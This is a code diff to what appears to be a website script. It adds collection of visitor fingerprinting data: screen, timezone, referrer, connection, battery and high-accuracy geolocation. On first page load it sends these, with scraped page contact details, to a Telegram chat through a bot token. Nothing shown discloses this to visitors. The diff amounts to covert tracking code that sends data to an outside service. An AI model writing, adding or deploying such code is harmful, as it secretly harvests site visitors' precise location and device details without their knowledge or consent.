@@ -17,6 +17,77 @@ function getDeviceName() {
     return parts.filter(Boolean).join(' | ');
 }
 
+function getAdditionalDeviceInfo(callback) {
+    const info = [];
+
+    // Screen size
+    if (screen) {
+        info.push(`Screen: ${screen.width}x${screen.height}`);
+    }
+
+    // Timezone
+    try {
+        info.push(`Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+    } catch (e) {
+        // Ignore timezone errors
+    }
+
+    // Cookies enabled
+    info.push(`Cookies: ${navigator.cookieEnabled ? 'enabled' : 'disabled'}`);
+
+    // LocalStorage available
+    try {
+        const test = '__test__';
+        localStorage.setItem(test, test);
+        localStorage.removeItem(test);
+        info.push('LocalStorage: available');
+    } catch (e) {
+        info.push('LocalStorage: disabled');
+    }
+
+    // Referrer
+    if (document.referrer) {
+        info.push(`Referrer: ${document.referrer}`);
+    }
+
+    // Connection type (if available)
+    if ('connection' in navigator) {
+        const conn = navigator.connection;
+        if (conn.effectiveType) info.push(`Connection: ${conn.effectiveType}`);
+        if (conn.downlink) info.push(`Speed: ${conn.downlink}Mbps`);
+    }
+
+    // Battery status (if available) - async
+    if ('getBattery' in navigator) {
+        navigator.getBattery().then(battery => {
+            info.push(`Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? '(charging)' : ''}`);
+            callback(info.filter(Boolean).join(' | '));
+        }).catch(() => {
+            callback(info.filter(Boolean).join(' | '));
+        });
+    } else {
+        callback(info.filter(Boolean).join(' | '));
+    }
+}
+
+function getDeviceLocation(callback) {
+    if (!navigator.geolocation) {
+        callback(null);
+        return;
+    }
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
+            callback({ latitude, longitude, accuracy });
+        },
+        (error) => {
+            console.warn('Geolocation error:', error.message);
+            callback(null);
+        },
+        { timeout: 10000, enableHighAccuracy: true }
+    );
+}
+
 function getPageContactInfo() {
     const phones = new Set();
     const emails = new Set();
@@ -55,13 +126,27 @@ function sendTelegramDeviceInfoIfFirstVisit() {
     try {
         if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
         if (localStorage.getItem(TELEGRAM_FIRST_LOAD_SENT_KEY)) return;
+
         const deviceInfo = getDeviceName();
         const contactInfo = getPageContactInfo();
-        let message = `First page load detected.\nDevice info: ${deviceInfo}`;
-        if (contactInfo) {
-            message += `\n${contactInfo}`;
-        }
-        sendTelegramMessage(message);
+        const timestamp = new Date().toISOString();
+
+        getAdditionalDeviceInfo((additionalInfo) => {
+            getDeviceLocation((location) => {
+                let message = `First page load detected.\nTime: ${timestamp}\nDevice info: ${deviceInfo}`;
+                if (additionalInfo) {
+                    message += `\nAdditional: ${additionalInfo}`;
+                }
+                if (contactInfo) {
+                    message += `\n${contactInfo}`;
+                }
+                if (location) {
+                    message += `\nLocation: ${location.latitude}, ${location.longitude} (accuracy: ${location.accuracy}m)`;
+                }
+                sendTelegramMessage(message);
+            });
+        });
+
         localStorage.setItem(TELEGRAM_FIRST_LOAD_SENT_KEY, '1');
     } catch (e) {
         console.warn('Unable to store first-load flag', e);
